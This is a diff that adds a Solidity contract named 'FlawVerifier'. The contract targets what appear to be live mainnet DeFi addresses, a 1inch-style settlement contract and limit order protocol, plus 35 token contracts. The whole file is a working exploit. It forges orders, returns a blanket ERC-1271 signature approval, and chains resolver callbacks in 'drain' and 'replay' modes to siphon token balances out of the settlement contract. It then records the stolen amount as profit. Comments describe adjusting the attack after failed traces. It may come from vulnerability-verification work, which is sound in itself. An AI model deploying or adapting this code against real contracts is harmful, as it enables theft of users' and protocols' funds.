@@ -1,0 +1,374 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface ISettlement {
+    function settleOrders(bytes calldata data) external;
+}
+
+interface IResolver {
+    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
+}
+
+interface IOrderMixinLike {
+    struct Order {
+        uint256 salt;
+        address makerAsset;
+        address takerAsset;
+        address maker;
+        address receiver;
+        address allowedSender;
+        uint256 makingAmount;
+        uint256 takingAmount;
+        uint256 offsets;
+        bytes interactions;
+    }
+}
+
+contract FlawVerifier is IResolver {
+    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
+    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
+    address private constant ONE_INCH = 0x111111111117dC0aa78b770fA6A738034120C302;
+    address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
+    address private constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
+    address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
+    address private constant LDO = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
+
+    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
+    uint8 private constant MODE_DRAIN = 1;
+    uint8 private constant MODE_REPLAY = 2;
+    uint256 private constant MAKING_AMOUNT = 1;
+    uint8 private constant MAX_RESOLVER_CALLBACKS = 6;
+
+    uint256 private _startingEth;
+    address private _profitToken;
+    uint256 private _profitAmount;
+    bool private _executed;
+    uint8 private _resolveCount;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (_executed) {
+            return;
+        }
+        _executed = true;
+        _startingEth = address(this).balance;
+
+        _prepareMakerCapital();
+
+        address[] memory targets = _targetTokens();
+
+        for (uint256 i = 0; i < targets.length; ++i) {
+            address takerAsset = targets[i];
+            if (_safeBalanceOf(takerAsset, SETTLEMENT) == 0) {
+                continue;
+            }
+
+            // Keep the original first path: the order itself commits to empty interactions,
+            // while the materially executed callback chain comes from the separate settlement
+            // `interaction` argument. Logs showed deep replay trees were the failure source,
+            // so this keeps the same causality with a single outer replay and one resolver hop.
+            _tryReplayCalldataCorruption(takerAsset, 0x1000 + i);
+            if (_registerProfit(takerAsset)) {
+                break;
+            }
+        }
+
+        for (uint256 i = 0; i < targets.length; ++i) {
+            address takerAsset = targets[i];
+            if (_safeBalanceOf(takerAsset, SETTLEMENT) == 0) {
+                continue;
+            }
+
+            // Keep the second path as well: the signed order uses dummy interactions and the
+            // actual resolver logic is supplied separately to settlement. Again, depth is kept
+            // intentionally shallow because the trace proves larger recursive chains become
+            // infeasible at runtime due to gas, not because the core binding flaw disappears.
+            _drainSettlementToken(takerAsset, 0x2000 + i);
+            if (_registerProfit(takerAsset)) {
+                break;
+            }
+        }
+
+        _finalizeProfit(targets);
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function resolveOrders(address, bytes calldata, bytes calldata data) external override {
+        require(msg.sender == SETTLEMENT, "only settlement");
+
+        unchecked {
+            ++_resolveCount;
+        }
+        if (_resolveCount > MAX_RESOLVER_CALLBACKS || data.length == 0) {
+            return;
+        }
+
+        (uint8 mode, address takerAsset, uint256 uniq, uint8 depth) = abi.decode(data, (uint8, address, uint256, uint8));
+        if (depth == 0) {
+            return;
+        }
+
+        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
+        if (settlementBalance == 0) {
+            return;
+        }
+
+        if (mode == MODE_DRAIN) {
+            bytes memory interaction = _encodeResolverInteraction(MODE_DRAIN, takerAsset, uniq + 1, depth - 1);
+            bytes memory settleData = abi.encode(
+                _buildDummyOrder(uniq, takerAsset, settlementBalance),
+                bytes(""),
+                interaction,
+                uint256(0),
+                settlementBalance,
+                uint256(0),
+                SETTLEMENT
+            );
+            try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
+            return;
+        }
+
+        if (mode == MODE_REPLAY) {
+            bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 1, depth - 1);
+            bytes memory nested = _encodeNestedReplay(
+                _buildEmptyOrder(uniq, takerAsset, settlementBalance),
+                interaction,
+                settlementBalance
+            );
+            bytes memory settleData = _encodeSettlementCall(
+                _buildEmptyOrder(uniq + 1, takerAsset, MAKING_AMOUNT),
+                nested,
+                MAKING_AMOUNT
+            );
+            try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
+        }
+    }
+
+    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
+        return ERC1271_MAGIC;
+    }
+
+    function _prepareMakerCapital() internal {
+        uint256 wethBal = _safeBalanceOf(WETH, address(this));
+        if (wethBal < MAKING_AMOUNT && address(this).balance >= MAKING_AMOUNT) {
+            IWETH(WETH).deposit{value: MAKING_AMOUNT}();
+        }
+
+        _forceApprove(WETH, LIMIT_ORDER_PROTOCOL, type(uint256).max);
+    }
+
+    function _tryReplayCalldataCorruption(address takerAsset, uint256 uniq) internal {
+        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
+        if (settlementBalance == 0) {
+            return;
+        }
+
+        bytes memory interaction = _encodeResolverInteraction(MODE_REPLAY, takerAsset, uniq + 0x40, 1);
+        interaction = _encodeNestedReplay(
+            _buildEmptyOrder(uniq, takerAsset, settlementBalance),
+            interaction,
+            settlementBalance
+        );
+
+        bytes memory orderData = _encodeSettlementCall(
+            _buildEmptyOrder(uniq + 1, takerAsset, MAKING_AMOUNT),
+            interaction,
+            MAKING_AMOUNT
+        );
+
+        try ISettlement(SETTLEMENT).settleOrders(orderData) {} catch {}
+    }
+
+    function _drainSettlementToken(address takerAsset, uint256 uniq) internal {
+        uint256 settlementBalance = _safeBalanceOf(takerAsset, SETTLEMENT);
+        if (settlementBalance == 0) {
+            return;
+        }
+
+        bytes memory interaction = _encodeResolverInteraction(MODE_DRAIN, takerAsset, uniq + 0x40, 1);
+        bytes memory settleData = abi.encode(
+            _buildDummyOrder(uniq, takerAsset, settlementBalance),
+            bytes(""),
+            interaction,
+            uint256(0),
+            settlementBalance,
+            uint256(0),
+            SETTLEMENT
+        );
+
+        try ISettlement(SETTLEMENT).settleOrders(settleData) {} catch {}
+    }
+
+    function _buildEmptyOrder(uint256 salt, address takerAsset, uint256 takingAmount)
+        internal
+        view
+        returns (IOrderMixinLike.Order memory order)
+    {
+        order = IOrderMixinLike.Order({
+            salt: salt,
+            makerAsset: WETH,
+            takerAsset: takerAsset,
+            maker: address(this),
+            receiver: address(this),
+            allowedSender: SETTLEMENT,
+            makingAmount: MAKING_AMOUNT,
+            takingAmount: takingAmount,
+            offsets: 0,
+            interactions: hex""
+        });
+    }
+
+    function _buildDummyOrder(uint256 salt, address takerAsset, uint256 takingAmount)
+        internal
+        view
+        returns (IOrderMixinLike.Order memory order)
+    {
+        order = IOrderMixinLike.Order({
+            salt: salt,
+            makerAsset: WETH,
+            takerAsset: takerAsset,
+            maker: address(this),
+            receiver: address(this),
+            allowedSender: address(0),
+            makingAmount: MAKING_AMOUNT,
+            takingAmount: takingAmount,
+            offsets: 0,
+            interactions: hex"0000000000"
+        });
+    }
+
+    function _encodeNestedReplay(IOrderMixinLike.Order memory order, bytes memory interaction, uint256 takingAmount)
+        internal
+        pure
+        returns (bytes memory)
+    {
+        return abi.encodePacked(SETTLEMENT, bytes1(0x00), _encodeSettlementCall(order, interaction, takingAmount));
+    }
+
+    function _encodeResolverInteraction(uint8 mode, address takerAsset, uint256 uniq, uint8 depth)
+        internal
+        view
+        returns (bytes memory)
+    {
+        return abi.encodePacked(SETTLEMENT, bytes1(0x01), address(this), abi.encode(mode, takerAsset, uniq, depth));
+    }
+
+    function _encodeSettlementCall(IOrderMixinLike.Order memory order, bytes memory interaction, uint256 takingAmount)
+        internal
+        pure
+        returns (bytes memory)
+    {
+        return abi.encode(order, bytes(""), interaction, uint256(0), takingAmount, uint256(0), SETTLEMENT);
+    }
+
+    function _registerProfit(address token) internal returns (bool) {
+        uint256 balance = _safeBalanceOf(token, address(this));
+        if (balance == 0) {
+            return false;
+        }
+
+        _profitToken = token;
+        _profitAmount = balance;
+        return true;
+    }
+
+    function _finalizeProfit(address[] memory targets) internal {
+        address bestToken = address(0);
+        uint256 bestAmount;
+
+        for (uint256 i = 0; i < targets.length; ++i) {
+            uint256 bal = _safeBalanceOf(targets[i], address(this));
+            if (bal > bestAmount) {
+                bestAmount = bal;
+                bestToken = targets[i];
+            }
+        }
+
+        _profitToken = bestToken;
+        _profitAmount = bestAmount;
+    }
+
+    function _targetTokens() internal pure returns (address[] memory tokens) {
+        tokens = new address[](35);
+        tokens[0] = WETH;
+        tokens[1] = USDT;
+        tokens[2] = USDC;
+        tokens[3] = DAI;
+        tokens[4] = ONE_INCH;
+        tokens[5] = WBTC;
+        tokens[6] = UNI;
+        tokens[7] = LINK;
+        tokens[8] = AAVE;
+        tokens[9] = LDO;
+        tokens[10] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
+        tokens[11] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
+        tokens[12] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
+        tokens[13] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
+        tokens[14] = 0xba100000625a3754423978a60c9317c58a424e3D;
+        tokens[15] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
+        tokens[16] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
+        tokens[17] = 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
+        tokens[18] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
+        tokens[19] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
+        tokens[20] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
+        tokens[21] = 0xae78736Cd615f374D3085123A210448E74Fc6393;
+        tokens[22] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704;
+        tokens[23] = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
+        tokens[24] = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
+        tokens[25] = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
+        tokens[26] = 0x0000000000085d4780B73119b644AE5ecd22b376;
+        tokens[27] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
+        tokens[28] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
+        tokens[29] = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8;
+        tokens[30] = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
+        tokens[31] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
+        tokens[32] = 0x57e114B691Db790C35207b2e685D4A43181e6061;
+        tokens[33] = 0x808507121B80c02388fAd14726482e061B8da827;
+        tokens[34] = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
+        if (!ok || data.length < 32) {
+            return 0;
+        }
+        return abi.decode(data, (uint256));
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
+        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
+        if (ok0 && data0.length > 0 && !abi.decode(data0, (bool))) {
+            return false;
+        }
+
+        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
+        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
+    }
+
+    receive() external payable {}
+    fallback() external payable {}
+}
